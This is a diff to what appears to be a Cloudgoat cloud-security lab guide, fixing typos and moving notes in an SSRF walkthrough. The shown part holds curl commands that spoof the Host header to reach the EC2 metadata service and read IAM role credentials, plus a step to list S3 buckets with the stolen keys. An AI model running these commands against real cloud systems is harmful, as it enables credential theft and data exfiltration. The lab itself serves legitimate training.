@@ -199,7 +199,7 @@ Create vulnerable infrastructure
 Start attack
 ============
 
-At this point we have created vulnerable infrastucute in AWS using
+At this point we have created vulnerable infrastructure in AWS using
 Cloudgoat. Starting as an anonymous outsider with no access or
 privileges, exploit a misconfigured reverse-proxy server to query the
 EC2 metadata service and acquire instance profile keys. Then, use those
@@ -211,11 +211,12 @@ Steal Role
 
 -  Replace ``<ec2-ip-address>`` with the IP address from the previoues
    step to get a role name. 
-.. note:: **Copy the response to a text file**.  You will need the role
 
 .. code:: bash
 
    curl -s http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254'
+   
+.. note:: **Copy the response to a text file**.  You will need the role
 
 .. figure:: ./images/role.png
    :alt: role
@@ -224,12 +225,13 @@ Steal Crendentials
 ++++++++++++++++++
 
 -  Replace ``<ec2-ip-address>`` and ``<ec2-role-name>`` from the
-   previous steps to get the keys.
-.. note::  **Copy response to text file**.  You will use the stolen credentials 
+   previous steps to get the keys
 
 .. code:: bash
 
    curl -s http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/<ec2-role-name> -H 'Host:169.254.169.254'
+
+.. note::  **Copy response to text file**.  You will use the stolen credentials
 
 .. figure:: ./images/ssrf2.png
    :alt: creds
@@ -291,7 +293,7 @@ Data Exfil
 .. figure:: ./images/sestoken.png
    :alt: sestoken
 |
--  List and search buckets the stolen credentails have access to
+-  Use aws cli to list and search buckets the stolen credentails have access to
 
 .. code:: bash
    
